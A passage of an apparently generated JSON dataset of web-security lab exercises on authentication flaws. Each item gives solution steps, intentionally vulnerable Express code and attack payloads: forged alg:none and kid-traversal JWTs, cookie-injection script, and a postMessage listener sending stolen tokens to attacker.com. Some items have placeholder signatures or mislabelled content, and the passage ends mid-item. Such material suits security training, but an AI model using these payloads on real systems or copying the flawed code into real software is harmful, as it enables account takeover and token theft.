    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify cookie-setting behavior with Burp Suite",
      "Craft malicious page on attacker.testdomain.com",
      "Set broad-scope session cookie via JavaScript",
      "Lure victim to attacker-controlled subdomain",
      "Capture authenticated session after victim login"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const cookieParser = require('cookie-parser');const app = express();app.use(cookieParser());app.get('/login', (req, res) => {if (!req.cookies.sessid) res.cookie('sessid', 'RANDOM_VALUE', {domain: '.testdomain.com'});if (req.query.user === 'admin') res.cookie('authenticated', 'true');res.send('Login page');});app.get('/admin', (req, res) => {if (req.cookies.authenticated === 'true') res.send('Sensitive data');else res.status(403).send('Access denied');});app.listen(3000);",
    "payloads": [
      "document.cookie=\"sessid=malicious;domain=.testdomain.com;path=/\"",
      "<iframe src=\"//attacker.testdomain.com/setcookie.html\"></iframe>"
    ]
  },
  {
    "Lab scenario": "MFA bypass via state parameter manipulation",
    "Lab Description": "The multi-factor authentication flow relies on client-side state validation. The application fails to verify server-side that the same device completes both authentication steps. To solve: initiate MFA on attacker device then complete on victim device by copying state parameters.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture initial auth request with OWASP ZAP",
      "Note state and nonce parameters in MFA initiation",
      "Inject parameters into victim's active session",
      "Bypass MFA by reusing valid state values",
      "Access account before token expiration"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();const sessions = {};app.post('/mfa/initiate', (req, res) => {const state = Math.random().toString(36).substring(2);const nonce = Math.random().toString(36).substring(2);sessions[state] = {nonce, verified: false};res.json({state, nonce});});app.post('/mfa/verify', (req, res) => {const {state, nonce} = req.body;if (sessions[state] && sessions[state].nonce === nonce) {sessions[state].verified = true;res.json({success: true});} else {res.status(400).json({error: 'Invalid state'});}});app.get('/account', (req, res) => {if (sessions[req.query.state]?.verified) res.send('Account data');else res.status(403).send('MFA required');});app.listen(3000);",
    "payloads": [
      "{\"state\":\"stolen_state\",\"nonce\":\"stolen_nonce\"}",
      "/account?state=compromised_state_value"
    ]
  },
  {
    "Lab scenario": "JWT kid header path traversal in microservice auth",
    "Lab Description": "The JWT validation service improperly processes kid header values, allowing local file inclusion. The application blindly trusts the kid parameter to load verification keys. To solve: forge a valid admin token by forcing the system to use a predictable local file as the verification key.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept authentication flow with Burp Suite to capture JWT structure",
      "Modify kid header to point to /dev/null or known static file",
      "Craft token with HS256 algorithm and simple known-key signature",
      "Bypass verification using file path traversal in kid parameter",
      "Access admin API endpoint with forged token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const fs = require('fs');const app = express();const validateToken = (token) => {const header = jwt.decode(token, {complete: true}).header;const key = fs.readFileSync(header.kid || 'keys/default.pem');return jwt.verify(token, key);};app.get('/admin', (req, res) => {try {const user = validateToken(req.headers.authorization);if (user.role === 'admin') res.send('Sensitive data');else res.status(403).send('Forbidden');} catch {res.status(401).send('Invalid token');}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii9kZXYvbnVsbCJ9.eyJyb2xlIjoiYWRtaW4ifQ.dBj3d3g6JZX6X5jY7X5jY7X5jY7X5jY7X5jY7X5jY",
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii9ldGMvcGFzc3dkIn0.eyJyb2xlIjoiYWRtaW4ifQ.8X5jY7X5jY7X5jY7X5jY7X5jY7X5jY7X5jY7X5jY"
    ]
  },
  {
    "Lab scenario": "OAuth token swapping via state parameter injection",
    "Lab Description": "The OAuth implementation fails to properly bind state parameters to session contexts. The application accepts valid tokens with mismatched state values. To solve: intercept another user's OAuth flow and swap their authorization code into your session while maintaining your original state parameter.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Initiate OAuth flow and capture state parameter with OWASP ZAP",
      "Intercept victim's authorization callback using proxy",
      "Modify callback to maintain original state but victim's code",
      "Complete OAuth flow with swapped credentials",
      "Access victim's resources through stolen token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();const sessions = {};const oauthTokens = {};app.get('/oauth/callback', (req, res) => {const {code, state} = req.query;if (!sessions[state]) return res.status(400).send('Invalid state');oauthTokens[state] = code;res.redirect('/welcome?state='+state);});app.get('/exchange', (req, res) => {const token = oauthTokens[req.query.state];if (token) res.json({access_token: 'VALID_'+token});else res.status(401).send('Invalid code');});app.listen(3000);",
    "payloads": [
      "/oauth/callback?code=VICTIM_CODE&state=ATTACKER_STATE",
      "/exchange?state=ATTACKER_STATE"
    ]
  },
  {
    "Lab scenario": "Session prediction via JTI collision in JWT revocation",
    "Lab Description": "The JWT revocation system uses predictable jti claims that can be brute-forced. The application fails to properly randomize unique token identifiers. To solve: predict valid jti values for active sessions and bypass token revocation checks.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture multiple JWTs to analyze jti pattern with jwt.io",
      "Identify incremental jti generation pattern",
      "Use Burp Intruder to brute-force valid jti ranges",
      "Craft token with predicted jti of active admin session",
      "Bypass revocation check and access protected resources"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();let lastJti = 1000;const revoked = new Set();app.post('/login', (req, res) => {lastJti++;const token = jwt.sign({user:req.body.user,jti:lastJti},'secret');res.json({token});});app.get('/admin', (req, res) => {try {const decoded = jwt.verify(req.headers.authorization, 'secret');if (revoked.has(decoded.jti)) throw Error();if (decoded.user === 'admin') res.send('Admin data');else res.status(403).send('Forbidden');} catch {res.status(401).send('Invalid token');}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJqdGkiOjEwNTV9.8X5jY7X5jY7X5jY7X5jY7X5jY7X5jY7X5jY7X5jY",
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJqdGkiOjEwNTZ9.8X5jY7X5jY7X5jY7X5jY7X5jY7X5jY7X5jY7X5jY"
    ]
  },
  {
    "Lab scenario": "MFA bypass via race condition in verification state",
    "Lab Description": "The multi-factor authentication system has a race window between verification and session update. The application checks MFA status without proper synchronization. To solve: send parallel requests to exploit the time gap between verification and session marking.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Initiate MFA flow and capture verification token with Burp",
      "Send 10 concurrent verification requests using Turbo Intruder",
      "Immediately request privileged endpoint during race window",
      "Identify successful bypass when session grants access",
      "Repeat until race condition is triggered"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();const sessions = {};app.post('/verify-mfa', (req, res) => {if (req.body.code === '123456') {setTimeout(() => {sessions[req.body.sessionId].verified = true;}, 500);res.send('Verifying...');}});app.get('/transfer', (req, res) => {if (sessions[req.query.sessionId]?.verified) res.send('Funds transferred');else res.status(403).send('MFA required');});app.listen(3000);",
    "payloads": [
      "POST /verify-mfa HTTP/1.1\r\n\r\nsessionId=race1&code=123456",
      "GET /transfer?sessionId=race1 HTTP/1.1"
    ]
  },
  {
    "Lab scenario": "Credential stuffing via HTTP verb tampering on auth endpoint",
    "Lab Description": "The authentication endpoint processes credentials differently based on HTTP methods. The application fails to properly validate credentials on HEAD requests while still returning valid session cookies. To solve: perform credential stuffing attacks using HEAD requests to bypass rate limiting.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify alternative HTTP methods accepted by auth endpoint with OPTIONS",
      "Capture successful login with POST to analyze cookie setting behavior",
      "Use Burp Intruder to send HEAD requests with credential list",
      "Filter responses for Set-Cookie headers indicating success",
      "Use stolen session cookies to access accounts"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();const users = {'admin':'password123'};app.head('/login', (req, res) => {res.set('Set-Cookie', 'session=HEAD_BYPASS');res.end();});app.post('/login', (req, res) => {if (users[req.body.user] === req.body.pass) {res.cookie('session', 'VALID_SESSION');res.send('Logged in');} else {res.status(401).send('Invalid credentials');}});app.get('/admin', (req, res) => {if (req.cookies.session === 'VALID_SESSION') res.send('Admin panel');else res.status(403).send('Forbidden');});app.listen(3000);",
    "payloads": [
      "HEAD /login HTTP/1.1\r\n\r\nuser=admin&pass=password123",
      "HEAD /login HTTP/1.1\r\n\r\nuser=admin&pass=guess1"
    ]
  },
  {
    "Lab scenario": "JWT claim injection via nested JSON objects",
    "Lab Description": "The JWT parser incorrectly processes nested JSON objects in claims, allowing privilege escalation. The application fails to properly validate claim structures when performing authorization checks. To solve: inject nested role objects to bypass admin checks while maintaining valid signature.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture valid JWT using Burp Suite and analyze structure",
      "Modify payload to include nested role object: {\"role\":{\"name\":\"admin\"}}",
      "Maintain original signature while adding nested claims",
      "Submit modified token to admin API endpoints",
      "Verify access to restricted functionality"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.get('/admin', (req, res) => {const token = req.headers.authorization.split(' ')[1];const payload = jwt.verify(token, 'secret');if (payload.role?.name === 'admin') res.send('Admin data');else res.status(403).send('Forbidden');});app.post('/login', (req, res) => {const token = jwt.sign({user:req.body.user,role:'user'},'secret');res.json({token});});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidGVzdCIsInJvbGUiOnsibmFtZSI6ImFkbWluIn19.8X5jY7X5jY7X5jY7X5jY7X5jY7X5jY7X5jY7X5jY",
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjp7Im5hbWUiOiJhZG1pbiJ9fQ.8X5jY7X5jY7X5jY7X5jY7X5jY7X5jY7X5jY7X5jY"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via iframe CSP bypass",
    "Lab Description": "The OAuth implementation leaks tokens through insecure iframe communication that bypasses CSP protections. The application fails to properly validate message origins in postMessage handlers. To solve: craft malicious page that extracts tokens via iframe contentWindow communication.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify OAuth iframe endpoints using OWASP ZAP",
      "Create attacker page with malicious postMessage listener",
      "Embed OAuth iframe with allow-same-origin",
      "Exfiltrate tokens via cross-frame JavaScript calls",
      "Use stolen tokens to authenticate as victim"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/oauth/iframe', (req, res) => {res.set('Content-Security-Policy', \"default-src 'self'\");res.send(`<script>window.addEventListener('message',e=>{window.parent.postMessage({token:'SECRET_TOKEN'},'*')})</script>`);});app.listen(3000);",
    "payloads": [
      "<iframe src=\"https://vulnerable.com/oauth/iframe\" onload=\"this.contentWindow.postMessage('','*')\"></iframe>",
      "<script>window.addEventListener('message',e=>{fetch('https://attacker.com?token='+e.data.token)})</script>"
    ]
  },
  {
    "Lab scenario": "Session fixation via WebSocket handshake",
    "Lab Description": "The application establishes sessions through WebSocket connections before authentication. The WebSocket handshake accepts attacker-provided session identifiers. To solve: fixate session ID during WS connection then authenticate to hijack the session.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept WebSocket handshake with Burp Suite",
      "Inject custom Session-ID header during connection",
      "Complete authentication through normal HTTP flow",
      "Reuse WebSocket session in authenticated context",
      "Verify session persistence across protocols"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const WebSocket = require('ws');const app = express();const sessions = {};const wss = new WebSocket.Server({ noServer: true });wss.on('connection', (ws, req) => {const sessionId = req.headers['session-id'];ws.session = sessions[sessionId] || {};});app.post('/login', (req, res) => {const sessionId = Math.random().toString(36);sessions[sessionId] = { user: req.body.user };res.json({ sessionId });});const server = app.listen(3000);server.on('upgrade', (req, socket, head) => {wss.handleUpgrade(req, socket, head, (ws) => {wss.emit('connection', ws, req);});});",
    "payloads": [
      "GET /chat HTTP/1.1\r\nHost: vulnerable.com\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSession-ID: FIXATED_ID\r\n\r\n",
      "wss://vulnerable.com/chat -H \"Session-ID: FIXATED_ID\""
    ]
  },
  {
    "Lab scenario": "MFA bypass via time-limited backup code reuse",
    "Lab Description": "The multi-factor authentication system improperly validates backup codes, allowing unlimited reuse within the expiration window. The application fails to track used backup codes in real-time. To solve: intercept valid backup code and reuse it before server-side invalidation.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture backup code during legitimate MFA flow using Burp",
      "Immediately reuse captured code in parallel session",
      "Bypass MFA before backend validation completes",
      "Maintain authenticated session after code expiration",
      "Access protected resources before session timeout"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();const usedCodes = new Set();app.post('/verify-backup', (req, res) => {const { code } = req.body;setTimeout(() => usedCodes.add(code), 10000);if (code === '123456') res.json({ verified: true });else res.status(400).json({ error: 'Invalid code' });});app.listen(3000);",
    "payloads": [
      "{\"code\":\"123456\"}",
      "{\"code\":\"123456\",\"user\":\"admin\"}"
    ]
  },
  {
    "Lab scenario": "Credential stuffing via case-insensitive password comparison",
    "Lab Description": "The authentication system performs case-insensitive password comparison, reducing effective password entropy. The application converts all passwords to lowercase before comparison. To solve: perform credential stuffing with case variations of known passwords.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Identify case-insensitive behavior via error messages with Postman",
      "Load known password lists into Burp Intruder",
      "Configure payload processing to generate case variations",
      "Launch attack with all case permutations",
      "Identify successful authentication attempts"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();const users = { 'admin': { password: 'Secret123' } };app.post('/login', (req, res) => {const user = users[req.body.user];if (user && user.password.toLowerCase() === req.body.pass.toLowerCase()) {res.send('Logged in');} else {res.status(401).send('Invalid credentials');}});app.listen(3000);",
    "payloads": [
      "{\"user\":\"admin\",\"pass\":\"SECRET123\"}",
      "{\"user\":\"admin\",\"pass\":\"secret123\"}"
    ]
  },
  {
    "Lab scenario": "JWT public key substitution via jwk header injection",
    "Lab Description": "The JWT validation endpoint improperly processes jwk header parameters, allowing attackers to specify their own verification keys. The application fails to validate the origin of supplied keys. To solve: forge a valid admin token by injecting a malicious jwk header with attacker-controlled public key.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture valid JWT using Burp Suite and analyze structure",
      "Generate RSA key pair using OpenSSL",
      "Craft token with jwk header containing public key",
      "Sign token with corresponding private key",
      "Submit forged token to admin API endpoints"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.post('/verify', (req, res) => {const token = req.body.token;const decoded = jwt.decode(token, {complete: true});const key = decoded.header.jwk ? jwt.verify(token, decoded.header.jwk) : jwt.verify(token, 'SECRET_KEY');if (key.role === 'admin') res.send('Admin access granted');else res.status(403).send('Forbidden');});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImp3ayI6eyJrdHkiOiJSU0EiLCJuIjoiMHhYWCJ9fQ.eyJyb2xlIjoiYWRtaW4ifQ.SIG"
    ]
  },
  {
    "Lab scenario": "OAuth token hijacking via insecure redirect_uri wildcards",
    "Lab Description": "The OAuth implementation accepts overly permissive redirect_uri values containing wildcards, allowing token interception. The application fails to properly validate redirect URLs against registered patterns. To solve: steal authorization codes by registering malicious callback endpoint matching wildcard pattern.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify OAuth client registration endpoint using OWASP ZAP",
      "Register client with redirect_uri containing * wildcard",
      "Initiate auth flow with attacker-controlled subdomain",
      "Intercept authorization code in redirect",
      "Exchange code for access token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();const clients = {};app.post('/register', (req, res) => {const clientId = Math.random().toString(36);clients[clientId] = {redirect_uri: req.body.redirect_uri};res.json({clientId});});app.get('/auth', (req, res) => {const client = clients[req.query.client_id];if (req.query.redirect_uri.startsWith(client.redirect_uri.replace('*',''))) {res.redirect(`${req.query.redirect_uri}?code=AUTH_CODE`);} else {res.status(400).send('Invalid redirect');}});app.listen(3000);",
    "payloads": [
      "{\"redirect_uri\":\"https://*.attacker.com/callback\"}",
      "/auth?client_id=CLIENT_ID&redirect_uri=https://evil.attacker.com/callback"
    ]
  },
  {
    "Lab scenario": "Session fixation via HTTP/2 header compression",
    "Lab Description": "The application assigns session IDs based on HTTP/2 header values that can be manipulated through compression contexts. The server fails to reset compression contexts between connections. To solve: fixate session ID by manipulating HPACK header compression state.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Establish multiple HTTP/2 connections using Burp Suite",
      "Analyze session assignment patterns",
      "Craft requests that manipulate HPACK state",
      "Fixate predictable session ID",
      "Hijack authenticated session"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const http2 = require('http2');const fs = require('fs');const server = http2.createSecureServer({key: fs.readFileSync('key.pem'),cert: fs.readFileSync('cert.pem')});const sessions = {};server.on('stream', (stream, headers) => {const sessionId = headers['x-custom-header'] || Math.random().toString(36);sessions[sessionId] = headers;stream.respond({'content-type': 'text/html'});stream.end(`Session ${sessionId}`);});server.listen(443);",
    "payloads": [
      "GET / HTTP/2\r\nHost: vulnerable.com\r\nx-custom-header: FIXATED_ID\r\n\r\n"
    ]
  },
  {
    "Lab scenario": "MFA bypass via state parameter reflection",
    "Lab Description": "The multi-factor authentication flow reflects unvalidated state parameters in successful responses. The application fails to maintain server-side state validation. To solve: bypass MFA by injecting arbitrary state parameters that get reflected back after verification.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept MFA initiation request with Burp Suite",
      "Modify state parameter to admin=true",
      "Complete MFA verification normally",
      "Capture reflected state in success response",
      "Access privileged functionality"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/mfa/start', (req, res) => {res.cookie('mfa_state', req.query.state || 'user');res.send('Verification required');});app.post('/mfa/verify', (req, res) => {const state = req.cookies.mfa_state;res.json({status: 'verified', state});});app.listen(3000);",
    "payloads": [
      "/mfa/start?state=admin",
      "{\"status\":\"verified\",\"state\":\"admin\"}"
    ]
  },
  {
    "Lab scenario": "Credential stuffing via password hash timing leak",
    "Lab Description": "The authentication system leaks valid usernames through password hash comparison timing differences. The application uses insecure string comparison for password hashes. To solve: enumerate valid users via timing attacks then perform targeted credential stuffing.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Measure response times for login attempts using OWASP ZAP",
      "Identify username candidates showing timing variations",
      "Perform statistical analysis of response times",
      "Confirm valid users through timing patterns",
      "Execute targeted password attacks"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const crypto = require('crypto');const app = express();const users = {'admin':'5f4dcc3b5aa765d61d8327deb882cf99'};app.post('/login', (req, res) => {const user = users[req.body.user];if (!user) return res.status(401).send('Invalid user');const inputHash = crypto.createHash('md5').update(req.body.pass).digest('hex');let match = true;for (let i = 0; i < user.length; i++) {if (user[i] !== inputHash[i]) match = false;}if (match) res.send('Logged in');else res.status(401).send('Invalid pass');});app.listen(3000);",
    "payloads": [
      "{\"user\":\"admin\",\"pass\":\"password\"}",
      "{\"user\":\"guest\",\"pass\":\"password\"}"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion via x5u header injection",
    "Lab Description": "The JWT validation endpoint improperly processes x5u header parameters, allowing algorithm confusion attacks. The application fails to validate certificate chain when loading verification keys from URLs. To solve: forge a valid admin token by injecting malicious x5u header pointing to attacker-controlled public key.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture valid JWT using Burp Suite and analyze structure",
      "Host spoofed X.509 certificate on attacker server",
      "Craft token with x5u header pointing to malicious cert",
      "Sign token with RS256 using corresponding private key",
      "Submit forged token to bypass admin checks"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const axios = require('axios');const app = express();app.post('/verify', async (req, res) => {const token = req.body.token;const header = jwt.decode(token, {complete: true}).header;const key = header.x5u ? (await axios.get(header.x5u)).data : 'SECRET_KEY';jwt.verify(token, key);if (jwt.decode(token).role === 'admin') res.send('Admin access');else res.status(403).send('Forbidden');});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsIng1dSI6Imh0dHBzOi8vYXR0YWNrZXIuY29tL2NlcnQifQ.eyJyb2xlIjoiYWRtaW4ifQ.SIG"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via iframe referrer policy",
    "Lab Description": "The OAuth implementation leaks tokens through insecure iframe referrer policies. The application fails to set proper referrer policies on iframe elements containing sensitive tokens. To solve: exfiltrate OAuth tokens by crafting malicious page that reads iframe document.referrer.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify OAuth iframe endpoints using OWASP ZAP",
      "Create attacker page with iframe pointing to OAuth endpoint",
      "Exploit missing referrer policy to read token from referrer header",
      "Capture token when victim visits malicious page",
      "Use stolen token to authenticate as victim"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/oauth/iframe', (req, res) => {res.send(`<script>window.location='https://vulnerable.com/callback?token=SECRET'</script>`);});app.listen(3000);",
    "payloads": [
      "<iframe src=\"https://vulnerable.com/oauth/iframe\" id=\"leak\"></iframe><script>setTimeout(()=>alert(document.getElementById('leak').contentDocument.referrer),1000)</script>"
    ]
  },
  {
    "Lab scenario": "Session fixation via WebTransport protocol",
    "Lab Description": "The application establishes sessions through WebTransport connections before authentication. The WebTransport handshake accepts attacker-provided session identifiers. To solve: fixate session ID during WebTransport connection then authenticate to hijack the session.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept WebTransport handshake with specialized proxy",
      "Inject custom Session-ID header during connection",
      "Complete authentication through normal HTTP flow",
      "Reuse WebTransport session in authenticated context",
      "Verify session persistence across protocols"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const { WebTransport } = require('@fails-components/webtransport');const server = new WebTransport({ port: 443 });const sessions = {};server.on('session', (session) => {const sessionId = session.headers['session-id'];session.socket = sessions[sessionId] || {};});",
    "payloads": [
      "CONNECT / HTTP/3\r\nHost: vulnerable.com\r\nSession-ID: FIXATED_ID\r\n\r\n"
    ]
  },
  {
    "Lab scenario": "MFA bypass via biometric replay",
    "Lab Description": "The multi-factor authentication system accepts replayed biometric verification data. The application fails to implement proper anti-replay protections for biometric authentication. To solve: intercept valid biometric data during authentication and replay it to bypass MFA.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture biometric authentication data with MITM proxy",
      "Analyze biometric data format and parameters",
      "Replay captured biometric data in new session",
      "Bypass MFA requirement with replayed data",
      "Access protected resources"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();const biometricData = [];app.post('/verify-biometric', (req, res) => {biometricData.push(req.body.data);if (biometricData.includes(req.body.data)) res.json({verified:true});else res.status(403).json({error:'Verification failed'});});app.listen(3000);",
    "payloads": [
      "{\"data\":\"BASE64_BIOMETRIC_SAMPLE\"}"
    ]
  },
  {
    "Lab scenario": "Credential stuffing via HTTP/3 connection reuse",
    "Lab Description": "The authentication system improperly reuses HTTP/3 connections for different users. The application fails to properly isolate connection contexts between authentication attempts. To solve: perform credential stuffing by reusing established HTTP/3 connection across multiple authentication attempts.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Establish HTTP/3 connection to target using specialized client",
      "Perform legitimate login to establish connection state",
      "Reuse same connection for credential stuffing attempts",
      "Bypass rate limits through connection persistence",
      "Identify successful authentication responses"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const http3 = require('http3');const server = http3.createServer();const connections = new Map();server.on('stream', (stream) => {const connId = stream.session.id;if (!connections.has(connId)) connections.set(connId, {auth: false});const state = connections.get(connId);if (stream.headers[':path'] === '/login') {state.auth = (stream.headers['password'] === 'correct');}if (state.auth) stream.respond({':status': 200});else stream.respond({':status': 401});});server.listen(443);",
    "payloads": [
      "GET /login HTTP/3\r\nHost: vulnerable.com\r\npassword: guess1\r\n\r\n"
    ]
  },
  {
    "Lab scenario": "JWT alg:none bypass in REST API",
    "Lab Description": "The lab's authentication system uses JSON Web Tokens with improper signature validation. The application accepts unsigned tokens when the alg header is set to 'none'. To solve: forge a valid JWT for the admin user by exploiting this vulnerability.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept a valid user session request with Burp Suite to capture a sample JWT",
      "Decode the JWT using jwt.io and observe the structure and claims",
      "Modify the algorithm header to 'none' and change the username claim to 'admin'",
      "Remove the signature portion of the JWT (after the second dot)",
      "Submit the modified token in an authorization header to access admin functionality"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();const users = {'user1':'pass123','admin':'admin123'};app.post('/login',(req,res)=>{const{username,password}=req.body;if(users[username]&&users[username]===password){const token=jwt.sign({user:username},'weaksecret',{algorithm:'HS256'});res.json({token});}else{res.status(401).send('Invalid credentials');}});app.get('/admin',(req,res)=>{try{const token=req.headers.authorization.split(' ')[1];const decoded=jwt.decode(token,{complete:true});if(decoded.header.alg==='none'){const user=decoded.payload.user;if(user==='admin'){res.send('Admin access granted');}}}catch(e){res.status(401).send('Invalid token');}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0."
    ]
  },
  {
    "Lab scenario": "GraphQL query depth exploitation",
    "Lab Description": "The GraphQL endpoint lacks proper depth limiting controls, allowing recursive queries that can lead to denial of service or data leakage. The application processes nested queries without restrictions. To solve: craft a recursive query to extract all user data from the database.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to send introspection queries to identify available schema types",
      "Discover user-related types and their relationships using __schema queries",
      "Construct a deeply nested query that recursively follows user relationships",
      "Use query batching to send multiple recursive queries in parallel",
      "Extract sensitive user data from the responses"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const { graphqlHTTP } = require('express-graphql');const { buildSchema } = require('graphql');const schema = buildSchema(`type User { id: ID! username: String! friends: [User] }type Query { getUser(id: ID!): User }`);const root = {getUser: ({id}) => db.getUser(id)};const app = express();app.use('/graphql', graphqlHTTP({schema,rootValue: root,graphiql: true}));app.listen(4000);",
    "payloads": [
      "query { getUser(id: \"1\") { username friends { username friends { username friends { username } } } }",
      "query { __schema { types { name fields { name type { name } } } }"
    ]
  },
  {
    "Lab scenario": "OAuth token hijacking via open redirect",
    "Lab Description": "The OAuth implementation has an open redirect vulnerability in the callback URL validation. The application fails to properly validate redirect URIs during token exchange. To solve: steal an OAuth token by crafting a malicious redirect URI and use it to authenticate as another user.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept OAuth flow with Burp Suite to identify callback parameters",
      "Modify the redirect_uri parameter to point to an attacker-controlled domain",
      "Trick a user into initiating OAuth with the malicious redirect URI",
      "Capture the authorization code or token from the redirect",
      "Exchange the code for an access token and authenticate as the victim"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();const clients = {'client1':{secret:'sec123',redirectURIs:['https://client1.com/callback']}};app.get('/oauth/authorize',(req,res)=>{const{client_id,redirect_uri}=req.query;if(clients[client_id]){res.redirect(`${redirect_uri}?code=rand123`);}});app.post('/oauth/token',(req,res)=>{const{client_id,client_secret,code}=req.body;if(clients[client_id]&&clients[client_id].secret===client_secret){res.json({access_token:'token123'});}});app.listen(3000);",
    "payloads": [
      "https://oauth-provider.com/oauth/authorize?client_id=client1&redirect_uri=https://attacker.com",
      "https://oauth-provider.com/oauth/authorize?client_id=client1&redirect_uri=https://client1.com.evil.com"
    ]
  },
  {
    "Lab scenario": "Session fixation via JWT in URL fragment",
    "Lab Description": "The application sets JWT tokens from URL fragments without proper validation, allowing session fixation attacks. The vulnerable endpoint accepts tokens from untrusted sources. To solve: craft a URL with a fixed session token and trick a user into authenticating with it.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Generate a valid JWT token with a long expiration time",
      "Craft a URL containing the token in the fragment identifier",
      "Use social engineering to make the victim visit the URL while logged in",
      "The application will adopt the attacker's token as the session identifier",
      "Access the victim's session using the pre-set token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();const users = {'user1':'pass123'};app.get('/auth',(req,res)=>{const token = req.url.split('#')[1];if(token){req.session.token = token;res.redirect('/');}});app.post('/login',(req,res)=>{const{username,password}=req.body;if(users[username]===password){const token = jwt.sign({user:username},'secret');res.json({redirect:`/auth#${token}`});}});app.listen(3000);",
    "payloads": [
      "http://vulnerable.com/auth#eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlcjEifQ.wTxqWLZLu7J6Ks7dYq7WgV9uY6JkQz7K1kZ8x6vY7dI",
      "http://vulnerable.com/auth#eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0."
    ]
  },
  {
    "Lab scenario": "MFA bypass via status parameter manipulation",
    "Lab Description": "The multi-factor authentication flow relies on client-side status parameters that can be manipulated. The application fails to verify MFA completion server-side before granting access. To solve: bypass MFA by modifying the authentication status parameter after initial login.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Log in with valid credentials using Burp Suite to intercept requests",
      "Observe the MFA verification request/response flow",
      "Identify the status parameter that indicates MFA completion",
      "Modify the status parameter before final submission",
